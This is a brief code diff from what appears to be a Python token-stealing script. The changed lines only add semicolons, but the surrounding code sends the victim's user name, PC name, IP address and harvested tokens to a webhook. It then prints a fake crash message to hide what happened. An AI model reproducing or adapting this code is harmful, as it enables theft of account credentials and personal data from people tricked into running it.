@@ -69,7 +69,7 @@ def main():
             message += 'No tokens found.\n'
 
     hook.send('```css\nDUDE ! YOU HAVE GRAB TOKEN ! \n\nName: '+str(user) + '\nPC NAME: ' + pc_name + '\nIP: {}'.format(ip) +'\n\nAll tokens found: ```')
-    print('Message do u want show like:')
-    print("Error the tool has crashed !")
+    print('Message do u want show like:');
+    print("Error the tool has crashed !");
 
 main()
